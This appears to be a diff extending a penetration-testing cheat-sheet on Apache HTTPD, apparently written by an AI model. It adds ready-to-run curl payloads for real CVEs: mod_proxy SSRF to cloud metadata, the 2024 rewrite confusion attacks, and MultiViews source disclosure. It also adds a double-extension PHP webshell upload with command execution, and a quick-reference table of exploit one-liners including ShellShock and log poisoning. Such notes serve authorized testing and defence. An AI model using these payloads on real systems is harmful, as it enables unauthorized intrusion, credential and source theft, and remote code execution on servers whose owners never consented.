@@ -1,11 +1,29 @@
+# Apache
+
 #Apache #ApacheHTTPD #webserver #webservices #RCE #LFI
 
 ## What is Apache HTTPD?
-Most widely deployed open-source web server. Highly modular — attack surface varies significantly based on enabled modules (mod_status, mod_cgi, mod_dav, mod_php). Several critical CVEs including unauthenticated path traversal/RCE. Distinct from generic HTTP enumeration — this note covers Apache-specific misconfigs, modules, and vulnerabilities.
+Most widely deployed open-source web server. Highly modular — attack surface varies significantly based on enabled modules (mod_status, mod_cgi, mod_dav, mod_php, mod_proxy, mod_rewrite). Several critical CVEs including unauthenticated path traversal/RCE (2.4.49/50) and the 2024 "confusion attack" class (mod_rewrite/handler/`?`-truncation). Distinct from generic HTTP enumeration — this note covers Apache-specific misconfigs, modules, and vulnerabilities.
 
 - Port: **TCP 80** — HTTP
 - Port: **TCP 443** — HTTPS
 - Version banner: `Server: Apache/2.4.xx (Ubuntu)`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Version/OS from banner; NSE `http-server-header`, `http-title`, `ssl-*` fingerprint |
+| [[Tools/File Transfer/cURL\|cURL]] | Manual probing — `server-status`/`server-info`, path-traversal & confusion-attack PoCs, `unix:` SSRF, WebDAV `PUT` |
+| [[Tools/Scanning/gobuster\|gobuster]] | Content/CGI discovery, `.htaccess`/`.htpasswd` and backup-file hunting |
+| [[Tools/Scanning/ffuf\|ffuf]] | `Apache.fuzz.txt` wordlist, PHP-extension bypass fuzzing |
+| [[Tools/File Transfer/wget\|wget]] | Recursive spider of an exposed `Options +Indexes` autoindex |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `apache_normalize_path_rce` (41773/42013), `apache_mod_cgi_bash_env_exec` (ShellShock) |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack `$apr1$` MD5-APR `.htpasswd` hashes (`-m 1600`) |
+| [[Tools/Auth/john the ripper\|John]] | Crack `.htpasswd` (APR1/bcrypt/SHA) |
+| [[Tools/File Transfer/cadaver\|cadaver]] | Interactive WebDAV client for `mod_dav` upload/move |
 
 ---
 
@@ -44,6 +62,22 @@ gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raf
 
 # Apache-specific wordlist
 ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
+```
+
+### MultiViews / mod_negotiation
+
+`Options +MultiViews` makes Apache content-negotiate: a request for `/foo` returns the best-matching `foo.*` on disk. This leaks the file-variant set and can hand you source.
+
+```bash
+# Probe: does the server negotiate? Ask for a base name with no extension.
+curl -s http://<target>/index          # returns index.php/index.html silently → MultiViews on
+
+# Force a 406 "Not Acceptable" — Apache lists every available variant of the resource
+curl -s -H "Accept: application/xrandom" http://<target>/index
+# → 406 body enumerates index.php, index.html, index.php.bak, index.en, ... (real filenames, no guessing)
+
+# Type-map (.var) handler can also enumerate/serve variants
+curl -s http://<target>/index.var
 ```
 
 ---
@@ -130,6 +164,52 @@ use exploit/multi/http/apache_normalize_path_rce
 set CVE CVE-2021-42013
 run
 ```
+
+### CVE-2021-40438 — mod_proxy SSRF (≤ 2.4.48)
+
+If `mod_proxy` is loaded and a `ProxyPass`/`RewriteRule [P]`/`ProxyPassMatch` maps user input into the proxied URL, a `unix:` prefix followed by a `|` redirects the proxy to an attacker-chosen backend — full SSRF (hit cloud metadata, internal hosts, other vhosts). CISA KEV, used in ransomware.
+
+**Conditions:** Apache ≤ 2.4.48 with mod_proxy enabled and a proxy directive that consumes part of the request path/query.
+
+```bash
+# The 'unix:' string must appear before the '|', and the '|' must be a literal
+# pipe (unencoded) sitting after the '?' arg separator so it isn't URL-encoded away.
+curl -s "http://<target>/?unix:$(python3 -c 'print("A"*5000)')|http://169.254.169.254/latest/meta-data/"
+
+# Reach an internal-only service through the proxy
+curl -s "http://<target>/?unix:$(python3 -c 'print("A"*5000)')|http://127.0.0.1:8080/"
+
+# Detection (blue-team): request URIs containing "unix:" ... "|" after "?"
+```
+
+The long `A` padding overflows the fixed unix-socket-path buffer so parsing falls through to the attacker URL after the `|`.
+
+### 2024 Confusion Attacks (Orange Tsai, ≤ 2.4.59)
+
+A class of URL/filename **semantic-confusion** bugs — Apache passes `r->filename` between modules that interpret it differently (URL vs filesystem path), and an encoded `?` (`%3F`) truncates or reroutes the resolved path. Patched in **2.4.60**. Several are in CISA KEV. Exact payloads depend on the target's `RewriteRule`s, so treat these as templates and confirm the rewrite behaviour first.
+
+```bash
+# CVE-2024-38475 — Filename Confusion: '?' truncates the rewritten filesystem path.
+# A RewriteRule like: RewriteRule ^/user/(.+)$ /var/user/$1/profile.yml
+# lets '%3F' cut off the intended '/profile.yml' suffix → read a sibling file / source.
+curl -s "http://<target>/user/orange%2Fsecret.yml%3F"       # → /var/user/orange/secret.yml
+
+# CVE-2024-38474 — Handler Confusion: encoded '?' mis-applies a [H=...php] RewriteFlag
+# to an uploaded non-PHP file → execute a webshell hidden in a GIF/upload.
+curl -s "http://<target>/upload/1.gif%3Fooo.php"            # runs 1.gif as PHP
+
+# CVE-2024-38476 — ACL/Auth Bypass: auth module sees 'admin.php?ooo.php' (no match to
+# the protected 'admin.php'), but PHP-FPM over mod_proxy normalises and executes it.
+curl -s "http://<target>/admin.php%3Fooo.php"
+
+# DocumentRoot Confusion: unsafe rewrite + traversal reaches on-disk 'gadget' scripts
+# outside the intended root (e.g. bundled example PHP under /usr/share).
+curl -s "http://<target>/html/usr/share/doc/websocketd/examples/php/dump-env.php%3F"
+
+# CVE-2024-39573 — mod_rewrite SSRF where the attacker controls the full RewriteRule prefix.
+```
+
+> [!warning] **Version gate.** The confusion set is fixed in httpd **2.4.60** (2024-07-01) — but that release also broke several legitimate configs, so patched-but-reverted or `LegacyRewrite`-style workarounds are common in the wild. Fingerprint the exact build (`Server:` header / `server-status`) before assuming patched.
 
 ### CVE-2014-6271 — ShellShock (CGI + Bash)
 
@@ -249,6 +329,14 @@ done
 # shell.php%00.jpg
 ```
 
+**Double extension (`AddHandler`/`mod_mime`).** If the server uses `AddHandler application/x-httpd-php .php` (rather than `SetHandler` inside a `<FilesMatch>`), mod_mime executes **any** file whose name *contains* a `.php` segment — so an upload filter that only checks the last extension is bypassed:
+
+```bash
+# shell.php.jpg — passes a ".jpg only" filter, still runs as PHP under AddHandler
+curl -X PUT http://<target>/uploads/shell.php.jpg -d '<?php system($_GET["cmd"]); ?>'
+curl "http://<target>/uploads/shell.php.jpg?cmd=id"
+```
+
 ### WebDAV (mod_dav)
 
 ```bash
@@ -298,6 +386,10 @@ curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
 | `mod_info` exposed | Full config + module disclosure |
 | `mod_cgi` + ShellShock-era bash | RCE via CGI headers |
 | Apache 2.4.49/50 unpatched | Unauthenticated path traversal + RCE |
+| Apache ≤ 2.4.59 (mod_rewrite/mod_proxy) | 2024 confusion attacks — source disclosure, ACL bypass, RCE, SSRF |
+| `mod_proxy` ≤ 2.4.48 with user-influenced proxy path | `unix:`-prefix SSRF (CVE-2021-40438) |
+| `Options +MultiViews` / mod_negotiation | Filename-variant & source disclosure via content negotiation |
+| `AddHandler ... .php` (vs `SetHandler` in `<FilesMatch>`) | Double-extension (`x.php.jpg`) upload → PHP execution |
 | `.htaccess` override allowed in upload dirs | .htaccess upload → PHP execution |
 | `AllowOverride All` in upload directories | .htaccess-based auth bypass / RCE |
 | Verbose error pages | Path, config, and version disclosure |
@@ -314,6 +406,11 @@ curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
 | server-info | `curl -s http://host/server-info` |
 | CVE-2021-41773 (path traversal) | `curl "http://host/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"` |
 | CVE-2021-41773 RCE (MSF) | `exploit/multi/http/apache_normalize_path_rce` |
+| CVE-2021-40438 (mod_proxy SSRF) | `curl "http://host/?unix:$(python3 -c 'print("A"*5000)')\|http://169.254.169.254/"` |
+| CVE-2024-38475 (filename confusion) | `curl "http://host/user/x%2Fsecret.yml%3F"` |
+| CVE-2024-38476 (ACL bypass) | `curl "http://host/admin.php%3Fooo.php"` |
+| MultiViews source leak | `curl -H "Accept: application/xrandom" http://host/index` (406 lists variants) |
+| Double-extension exec | `PUT /uploads/shell.php.jpg` then `?cmd=id` |
 | ShellShock | `curl -H 'User-Agent: () { :; }; /bin/bash ...' http://host/cgi-bin/x.cgi` |
 | Log poison | `curl -A '<?php system($_GET["cmd"]); ?>' http://host/` |
 | LFI + log | `?file=/var/log/apache2/access.log&cmd=id` |
@@ -323,5 +420,5 @@ curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
 ---
 
 *Created: 2026-07-13*
-*Updated: 2026-08-20*
-*Model: claude-opus-5*
+*Updated: 2026-09-24*
+*Model: claude-opus-4-8*
